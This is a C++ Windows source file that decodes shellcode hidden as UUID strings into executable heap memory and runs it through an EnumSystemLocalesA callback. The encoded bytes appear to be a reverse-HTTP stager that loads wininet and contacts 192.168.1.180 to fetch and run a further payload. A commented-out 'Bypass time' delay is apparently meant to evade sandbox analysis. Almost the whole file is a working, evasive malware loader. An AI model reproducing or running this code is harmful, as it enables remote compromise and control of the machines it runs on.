#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    "e48348fc-e8f0-00cc-0000-415141505248",
    "4865d231-528b-5160-5648-8b5218488b52",
    "c9314d20-0f48-4ab7-4a48-8b72504831c0",
    "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
    "528b4852-8b20-3c42-4801-d04151668178",
    "0f020b18-7285-0000-008b-808800000048",
    "6774c085-0148-8bd0-4818-448b40205049",
    "56e3d001-314d-48c9-ffc9-418b34884801",
    "c03148d6-c141-0dc9-ac41-01c138e075f1",
    "244c034c-4508-d139-75d8-58448b402449",
    "4166d001-0c8b-4448-8b40-1c4901d0418b",
    "01488804-41d0-4158-585e-595a41584159",
    "83485a41-20ec-5241-ffe0-5841595a488b",
    "ff4be912-ffff-485d-31db-5349be77696e",
    "74656e69-4100-4856-89e1-49c7c24c7726",
    "53d5ff07-4853-e189-535a-4d31c04d31c9",
    "ba495353-563a-a779-0000-0000ffd5e80e",
    "31000000-3239-312e-3638-2e312e313830",
    "89485a00-49c1-c0c7-fb20-00004d31c953",
    "53036a53-ba49-8957-9fc6-00000000ffd5",
    "000079e8-2f00-6934-6e37-526158334a73",
    "746f5172-6747-4c73-5134-6f6741384469",
    "506c475f-7939-4b4b-7676-4d4c6c5f7149",
    "6a315951-6242-706f-4851-786d772d5f4e",
    "49737266-6364-7a4e-6230-517071774954",
    "47474934-5f58-7849-4c48-476d6675696d",
    "496e416a-394a-4c4c-3458-593758385f53",
    "5a617261-654d-5070-716f-50744a004889",
    "415a53c1-4d58-c931-5348-b80032a88400",
    "50000000-5353-c749-c2eb-552e3bffd548",
    "0a6ac689-485f-f189-6a1f-5a5268803300",
    "e0894900-046a-5941-49ba-75469e860000",
    "d5ff0000-314d-53c0-5a48-89f14d31c94d",
    "5353c931-c749-2dc2-0618-7bffd585c075",
    "c1c7481f-1388-0000-49ba-44f035e00000",
    "d5ff0000-ff48-74cf-02eb-aae855000000",
    "406a5953-495a-d189-c1e2-1049c7c00010",
    "ba490000-a458-e553-0000-0000ffd54893",
    "89485353-48e7-f189-4889-da49c7c00020",
    "89490000-49f9-12ba-9689-e200000000ff",
    "c48348d5-8520-74c0-b266-8b074801c385",
    "58d275c0-58c3-006a-5949-c7c2f0b5a256",
    "0000d5ff-0000-0000-0000-000000000000",
};

int main()
{
    time_t s = time(0);
    int sec = 18;
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status == RPC_S_OK) {
            printf("uuid: %s | GOOD \n", uuids[i]);
        }
        else
        {
            printf("uuid: %s | BAD \n", uuids[i]);
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }
    //see it in memory
    //printf("[*] Hexdump: ");
    //for (int i = 0; i < elems * 16; i++) {
    //    printf("%02X ", ((unsigned char*)ha)[i]);
    //}
    
    //Bypass time
    //while (time(0) - s <= sec)
    //{
    //    printf("\r%d seconds: ", (time(0) - s));
    //}
    //execute shellcode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}

